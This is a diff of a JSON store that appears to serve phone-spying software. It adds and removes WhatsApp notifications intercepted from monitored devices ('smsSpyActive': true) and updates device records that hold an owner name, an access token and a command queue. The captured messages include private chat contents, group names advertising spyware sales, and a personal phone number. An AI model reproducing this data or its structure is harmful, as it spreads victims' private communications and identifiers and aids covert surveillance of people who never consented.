@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1177 pesan): ~ .",
+        "content": "💟 Stiker",
+        "time": "02/04 05:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775080752190
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1176 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "02/04 05:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775080744958
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (26 pesan): ~ STR",
         "content": "📷 550+",
         "time": "02/04 05:59",
@@ -4003,22 +4019,6 @@
         "time": "02/04 00:58",
         "pkg": "com.whatsapp",
         "receivedAt": 1775062728102
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (23 pesan): ~ 𝐙𝐈𝐋 𝐀𝐉𝐀𝐀𝐀",
-        "content": "on culik",
-        "time": "02/04 00:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775062728027
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (35 pesan): ~ Ubill",
-        "content": "Pm",
-        "time": "02/04 00:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775062727953
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1177 pesan): ~ .",
+        "content": "💟 Stiker",
+        "time": "02/04 05:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775080752234
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1648 pesan dari 14 chat",
+        "time": "02/04 05:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775080752212
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1176 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "02/04 05:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775080745016
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (26 pesan): ~ STR",
+        "content": "📷 550+",
+        "time": "02/04 05:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775080744915
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎All Buyer Pegasus-X ( No Update ) (282 pesan): ~ raxz",
@@ -8032,38 +8064,6 @@
         "time": "02/04 00:58",
         "pkg": "com.whatsapp",
         "receivedAt": 1775062729280
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (262 pesan): ~ Kyy X Nasgor",
-        "content": "@⁨~Zal7Sex⁩ Pegasus-x room nya di bug",
-        "time": "02/04 00:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775062728167
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (23 pesan): ~ 𝐙𝐈𝐋 𝐀𝐉𝐀𝐀𝐀",
-        "content": "on culik",
-        "time": "02/04 00:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775062728006
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (35 pesan): ~ Ubill",
-        "content": "Pm",
-        "time": "02/04 00:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775062727967
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "APK BUG BY ZYRXX: ~ sanzz",
-        "content": "🎥 Diskon 25k aja pm 083181647282 (0.36)",
-        "time": "02/04 00:58",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775062727921
       }
     ],
     "galleryPhotos": [],
@@ -8483,7 +8483,7 @@
     "deviceName": "HP-AHMADDDD1-4708",
     "ownerUsername": "Axmadz",
     "token": "520070cf4248976c6a5bc8d7767d78d8",
-    "lastSeen": 1775080741778,
+    "lastSeen": 1775080750788,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T17:49:10.524Z",
